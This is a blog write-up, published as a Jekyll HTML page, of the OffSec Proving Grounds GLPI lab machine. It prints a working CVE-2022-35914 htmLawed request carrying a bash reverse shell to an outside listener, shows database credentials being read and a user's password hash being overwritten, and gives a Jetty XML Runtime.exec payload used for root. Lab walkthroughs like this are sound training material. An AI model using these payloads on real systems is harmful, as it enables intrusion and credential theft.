@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: GLPI</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: GLPI | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: GLPI" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/15/Proving_grounds_Practice-GLPI.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/15/Proving_grounds_Practice-GLPI.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-15T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: GLPI" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-15T02:00:00+05:30","datePublished":"2023-10-15T02:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Play: GLPI","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/15/Proving_grounds_Practice-GLPI.html"},"url":"http://localhost:4000/2023/10/15/Proving_grounds_Practice-GLPI.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/15/Proving_grounds_Practice-GLPI.html">
+    <h2 class="post-title">Proving grounds Play: GLPI</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 15, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 984e5de1e697296fd9e0d482a8f64f3f (RSA)
+|   256 5723571ffd7706be256661146dae5e98 (ECDSA)
+|_  256 c79baad5a6333591341eefcf61a8301c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Authentication - GLPI
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: C01D32D71C01C8426D635C68C4648B09
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="80tcp-open--http---apache-httpd-2441-ubuntu">80/tcp open  http - Apache httpd 2.4.41 ((Ubuntu))</h2>
+
+<p>http://192.168.169.242/</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/GLPI/web.png" alt="img" /></p>
+
+<h2 id="directory-and-file-fuzzing">Directory and File Fuzzing</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[21:47:25] 301 -  317B  - /ajax  -&gt;  http://192.168.169.242/ajax/
+[21:47:28] 301 -  316B  - /bin  -&gt;  http://192.168.169.242/bin/
+[21:47:32] 301 -  319B  - /config  -&gt;  http://192.168.169.242/config/
+[21:47:33] 301 -  316B  - /css  -&gt;  http://192.168.169.242/css/
+[21:47:37] 301 -  318B  - /files  -&gt;  http://192.168.169.242/files/
+[21:47:38] 301 -  318B  - /front  -&gt;  http://192.168.169.242/front/
+[21:47:41] 301 -  316B  - /inc  -&gt;  http://192.168.169.242/inc/
+[21:47:41] 200 -    9KB - /index.php
+[21:47:41] 301 -  320B  - /install  -&gt;  http://192.168.169.242/install/
+[21:47:42] 301 -  315B  - /js  -&gt;  http://192.168.169.242/js/
+[21:47:43] 301 -  316B  - /lib  -&gt;  http://192.168.169.242/lib/
+[21:47:44] 200 -   34KB - /LICENSE
+[21:47:45] 301 -  324B  - /marketplace  -&gt;  http://192.168.169.242/marketplace/
+[21:47:50] 301 -  317B  - /pics  -&gt;  http://192.168.169.242/pics/
+[21:47:51] 301 -  320B  - /plugins  -&gt;  http://192.168.169.242/plugins/
+[21:47:54] 301 -  319B  - /public  -&gt;  http://192.168.169.242/public/
+[21:47:56] 200 -   79KB - /phpinfo.php
+[21:47:59] 403 -  280B  - /server-status
+[21:48:02] 301 -  318B  - /sound  -&gt;  http://192.168.169.242/sound/
+[21:48:02] 301 -  316B  - /src  -&gt;  http://192.168.169.242/src/
+[21:48:05] 301 -  322B  - /templates  -&gt;  http://192.168.169.242/templates/
+[21:48:08] 301 -  319B  - /vendor  -&gt;  http://192.168.169.242/vendor/
+</code></pre></div></div>
+
+<p>Tthe changelog file disclosed the exact version of the GLPI which is 10.0.2. The sql error log file disclosed the username in the machine.</p>
+
+<p>http://192.168.169.242/files/_log/</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/GLPI/log.png" alt="img" /></p>
+
+<h2 id="users">Users</h2>
+
+<ul>
+  <li>betty</li>
+</ul>
+
+<h2 id="cve-2022-35914">CVE-2022-35914</h2>
+
+<p>The GLPI v10.0.2 is vulnerable to <a href="https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/">GLPI htmlawed (CVE-2022-35914)</a> exploit.</p>
+
+<p>Direct to the URL <code class="language-plaintext highlighter-rouge">/vendor/htmlawed/htmlawed/htmLawedTest.php</code>.</p>
+
+<p>http://192.168.169.242/vendor/htmlawed/htmlawed/htmLawedTest.php</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/GLPI/exp.png" alt="img" /></p>
+
+<p>As mentioned in the exploit blog the exploitation is easy if the <code class="language-plaintext highlighter-rouge">exec</code> function is enabled in the settings and in our case the function has been disabled. So in order to achieve the remote code execution we have to use the callback functions like array_map,call_user_func,…</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/vendor/htmlawed/htmlawed/htmLawedTest.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.169.242</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">127</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">sid=bs</span>
+
+
+text=call_user_func&amp;hhook=array_map&amp;hexec=system&amp;sid=bs&amp;spec[0]=&amp;spec[1]=bash+-c+'bash+-i+&gt;%26+/dev/tcp/192.168.45.194/80+0&gt;%261'
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>192.168.45.194] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.169.242] 42674
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1084<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@glpi:/var/www/glpi/vendor/htmlawed/htmlawed<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p><strong>Initial Foothold Obtained</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Internal running process shows mysql server is running on port 3306.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glpi:/home/betty<span class="nv">$ </span>netstat <span class="nt">-antup</span>
+netstat <span class="nt">-antup</span>
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:33060         0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:8080            0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 192.168.169.242:80      192.168.45.194:39558    ESTABLISHED -                   
+tcp        0    140 192.168.169.242:60292   192.168.45.194:80       ESTABLISHED 3203/bash           
+udp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>                           -                  
+</code></pre></div></div>
+
+<p><strong>MySQL Credentials</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glpi:/var/www/glpi/config<span class="nv">$ </span><span class="nb">cat </span>config_db.php
+<span class="nb">cat </span>config_db.php
+&lt;?php
+class DB extends DBmysql <span class="o">{</span>
+   public <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+   public <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">'glpi'</span><span class="p">;</span>
+   public <span class="nv">$dbpassword</span> <span class="o">=</span> <span class="s1">'glpi_db_password'</span><span class="p">;</span>
+   public <span class="nv">$dbdefault</span> <span class="o">=</span> <span class="s1">'glpi'</span><span class="p">;</span>
+   public <span class="nv">$use_utf8mb4</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+   public <span class="nv">$allow_myisam</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+   public <span class="nv">$allow_datetime</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+   public <span class="nv">$allow_signed_keys</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+<span class="o">}</span>
+www-data@glpi:/var/www/glpi/config<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Login to mysql and update password for user betty.</p>
+
+<p>Generate Bcrypt hash for the new password from <a href="https://bcrypt.online/">here</a> <code class="language-plaintext highlighter-rouge">password:$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu</code>.</p>
+
+<p><strong>Update new password</strong></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; update glpi_users <span class="nb">set </span><span class="nv">password</span><span class="o">=</span><span class="s1">'$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu'</span> where <span class="nb">id</span><span class="o">=</span>7<span class="p">;</span>
+update glpi_users <span class="nb">set </span><span class="nv">password</span><span class="o">=</span><span class="s1">'$2y$10$fru.LI69CNTHWpFP.w84N.qq/8n8S9.fkKjK1lp95Q1anPY6yhRzu'</span> where <span class="nb">id</span><span class="o">=</span>7<span class="p">;</span>
+Query OK, 1 row affected <span class="o">(</span>0.00 sec<span class="o">)</span>
+Rows matched: 1  Changed: 1  Warnings: 0
+</code></pre></div></div>
+
+<p>Login to user betty on the GLPI web application.</p>
+
+<p>There is a ticket created by betty for password reset and the ticket contains the latest password for the user betty.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/GLPI/ticket.png" alt="img" /></p>
+
+<p>SSH to the user betty using credentials <code class="language-plaintext highlighter-rouge">betty:SnowboardSkateboardRoller234</code>.</p>
+
+<p>Download and run <code class="language-plaintext highlighter-rouge">pspy</code> on the attacking machine to monitor the running process to escalate privileges.</p>
+
+<p>pspy show the jetty server is running as root user.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2023/10/17 02:30:24 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1449   | /usr/libexec/fwupd/fwupd 
+2023/10/17 02:30:24 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1255   | /usr/bin/java <span class="nt">-Djava</span>.io.tmpdir<span class="o">=</span>/tmp <span class="nt">-Djetty</span>.home<span class="o">=</span>/opt/jetty <span class="nt">-Djetty</span>.base<span class="o">=</span>/opt/jetty/jetty-base <span class="nt">--class-path</span> /opt/jetty/jetty-base/resources:/opt/jetty/lib/logging/slf4j-api-2.0.0.jar:/opt/jetty/lib/logging/jetty-slf4j-impl-11.0.12.jar:/opt/jetty/lib/jetty-jakarta-servlet-api-5.0.2.jar:/opt/jetty/lib/jetty-http-11.0.12.jar:/opt/jetty/lib/jetty-server-11.0.12.jar:/opt/jetty/lib/jetty-xml-11.0.12.jar:/opt/jetty/lib/jetty-util-11.0.12.jar:/opt/jetty/lib/jetty-io-11.0.12.jar:/opt/jetty/lib/jetty-security-11.0.12.jar:/opt/jetty/lib/jetty-servlet-11.0.12.jar:/opt/jetty/lib/jetty-webapp-11.0.12.jar:/opt/jetty/lib/jetty-deploy-11.0.12.jar org.eclipse.jetty.xml.XmlConfiguration java.version<span class="o">=</span>11.0.17 java.version.major<span class="o">=</span>11 java.version.micro<span class="o">=</span>17 java.version.minor<span class="o">=</span>0 java.version.platform<span class="o">=</span>11 jetty.base<span class="o">=</span>/opt/jetty/jetty-base jetty.base.uri<span class="o">=</span>file:///opt/jetty/jetty-base jetty.home<span class="o">=</span>/opt/jetty jetty.home.uri<span class="o">=</span>file:///opt/jetty jetty.state<span class="o">=</span>/opt/jetty/jetty-base/jetty.state jetty.webapp.addServerClasses<span class="o">=</span>org.eclipse.jetty.logging.,<span class="k">${</span><span class="nv">jetty</span><span class="p">.home.uri</span><span class="k">}</span>/lib/logging/,org.slf4j. runtime.feature.alpn<span class="o">=</span><span class="nb">true </span>slf4j.version<span class="o">=</span>2.0.0 /opt/jetty/etc/jetty-bytebufferpool.xml /opt/jetty/etc/jetty-threadpool.xml /opt/jetty/etc/jetty.xml /opt/jetty/etc/jetty-webapp.xml /opt/jetty/etc/jetty-deploy.xml /opt/jetty/etc/jetty-http.xml /opt/jetty/etc/jetty-started.xml start-log-file<span class="o">=</span>/var/run/jetty/jetty-start.log 
+</code></pre></div></div>
+
+<p>The jetty server is vulnerable to remote code execution vulnerability.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/GLPI/jetty.jpg" alt="img" /></p>
+
+<p><a href="https://twitter.com/ptswarm/status/1555184661751648256">More</a></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<ul>
+  <li>Direct to <code class="language-plaintext highlighter-rouge">/opt/jetty/jetty-base/</code> and check for any web apps folder.</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+l 24
+drwxr-xr-x 5 root  root  4096 Mar 21  2023 <span class="nb">.</span>
+drwxr-xr-x 7 root  root  4096 Jan 25  2023 ..
+<span class="nt">-rw-r--r--</span> 1 root  root   104 Mar 21  2023 jetty.state
+drwxr-xr-x 2 root  root  4096 Jan 25  2023 resources
+drwxr-xr-x 2 root  root  4096 Jan 25  2023 start.d
+drwxr-xr-x 2 betty betty 4096 Jan 25  2023 webapps      <span class="c">#webapp</span>
+betty@glpi:/opt/jetty/jetty-base<span class="nv">$ </span>
+</code></pre></div></div>
+<ul>
+  <li>Create a xml file as below.</li>
+</ul>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd"&gt;</span>
+<span class="nt">&lt;Configure</span> <span class="na">class=</span><span class="s">"org.eclipse.jetty.server.handler.ContextHandler"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Call</span> <span class="na">class=</span><span class="s">"java.lang.Runtime"</span> <span class="na">name=</span><span class="s">"getRuntime"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;Call</span> <span class="na">name=</span><span class="s">"exec"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;Arg&gt;</span>
+                <span class="nt">&lt;Array</span> <span class="na">type=</span><span class="s">"String"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;Item&gt;</span>/tmp/run.sh<span class="nt">&lt;/Item&gt;</span>
+                <span class="nt">&lt;/Array&gt;</span>
+            <span class="nt">&lt;/Arg&gt;</span>
+        <span class="nt">&lt;/Call&gt;</span>
+    <span class="nt">&lt;/Call&gt;</span>
+<span class="nt">&lt;/Configure&gt;</span>
+</code></pre></div></div>
+
+<p>The file will run the <code class="language-plaintext highlighter-rouge">/tmp/run.sh</code> file as root which will give us the root shell.</p>
+
+<ul>
+  <li>Create reverse shell in <code class="language-plaintext highlighter-rouge">/tmp/run.sh</code> file.</li>
+</ul>
+
+<blockquote>
+  <p>Note: In order to trigger the jetty server, the run.xml file has to be updated or renamed or anything. The modification of xml file inside the webapps folder will immediately trigger the server.</p>
+
+  <p>So it will be great if the /tmp/run.sh file is created before run.xml file. Another important note that the out of band connections are not allowed in the machine, so for root shell reverse connection the netcat should be running internally.</p>
+</blockquote>
+
+<h2 id="tmprunsh">/tmp/run.sh</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1'"</span> <span class="o">&gt;</span> /tmp/run.sh
+</code></pre></div></div>
+
+<ul>
+  <li>Running netcat listener locally.</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ty@glpi:~<span class="nv">$ </span>which nc
+/usr/bin/nc
+betty@glpi:~<span class="nv">$ </span>/usr//bin/nc <span class="nt">-lvnp</span> 4444
+Listening on 0.0.0.0 4444
+</code></pre></div></div>
+
+<ul>
+  <li>Add xml exploit to the run.xml file.</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>betty@glpi:/opt/jetty/jetty-base/webapps<span class="nv">$ </span>nano run.xml
+betty@glpi:/opt/jetty/jetty-base/webapps<span class="nv">$ </span><span class="nb">ls
+</span>run.xml
+betty@glpi:/opt/jetty/jetty-base/webapps<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Wait for reverse connection.</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>betty@glpi:~<span class="nv">$ </span>/usr//bin/nc <span class="nt">-lvnp</span> 4444
+Listening on 0.0.0.0 4444
+Connection received on 127.0.0.1 34940
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1254<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@glpi:/opt/jetty/jetty-base# 
+</code></pre></div></div>
+
+<p><strong>Root Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
